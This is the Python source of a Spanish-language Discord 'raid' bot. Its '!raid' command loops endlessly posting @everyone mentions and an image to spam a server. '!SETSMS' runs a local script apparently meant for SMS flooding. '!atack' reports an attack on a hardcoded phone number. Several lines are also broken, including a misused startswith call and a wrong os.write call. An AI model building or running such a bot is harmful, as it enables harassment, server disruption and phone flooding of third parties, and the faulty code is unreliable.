import discord
import os

client = discord.Client()


@client.event
async def on_ready():
    print('We have logged in as {0.user}'.format(client))


@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('!chill'):
         await message.channel.send("chill")

    #emojis = (':neutral_face: @everyone :neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face::neutral_face:')
    emojis = ('@everyone')
    gif = ('https://media.discordapp.net/attachments/807053711871443024/809997406677630996/neutral_face.png?width=458&height=458')

    if message.content.startswith('!raid', print('the raid begin')):
        while True:
            await message.channel.send(emojis)
            await message.channel.send(gif)

    help = ("""```py
!chill = chill como siempre

!ayuda = informacion de los comandos del bot

!sr = acaba la raid

!raid = raid

!SETSMS = entra a SETSMS

!neofetch = muestra informacion del sistema

!atack (esta en desarrollo)

            ```""")

    if message.content.startswith('!ayuda'):
        await message.channel.send(help)

    if message.content.startswith('!sr'):
        exit(print("raid over"))

    neofetch = ("""
           ```py

                         host information


                                   u0_a138@localhost
          +hydNNNNdyh+             -----------------
        +mMMMMMMMMMMMMm+           OS: Android 9 armv7l
      dMMm:NMMMMMMN:mMMd           Host: motorola moto e6 play
      hMMMMMMMMMMMMMMMMMMh         Kernel: 4.4.146+
  ..  yyyyyyyyyyyyyyyyyyyy  ..     Uptime: 26 days, 18 hours, 5
.mMMmMMMMMMMMMMMMMMMMMMMMmMMm.     Packages: 133 (dpkg), 1 (pkg
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:   Shell: bash 5.1.4
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:   CPU: MT6739WW (4) @ 1.495GHz
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:   Memory: 1164MiB / 1862MiB
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
-MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM-
 +yy+ MMMMMMMMMMMMMMMMMMMM +yy+
      mMMMMMMMMMMMMMMMMMMm
      /++MMMMh++hMMMM++/
          MMMMo  oMMMM
          MMMMo  oMMMM
          oNMm-  -mMNs
          
                       ```
	    """)

    if message.content.startswith('!neofetch'):
        await message.channel.send(neofetch)

    if message.content.startswith('!SETSMS'):
        os.system("cd SETSMS ; bash SETSMS.sh")
        await message.channel.send("esta en SETSMS!")

    numero = ("+573222222222")
    if message.content.startswith('!atack'):
        await message.channel.send(f"se ataco a : {numero} se demora unos 3-4 minutos")

    if message.content.startswith('test'):
        await message.channel.send(numero)
        os.write(f"{numero}")

client.run('')
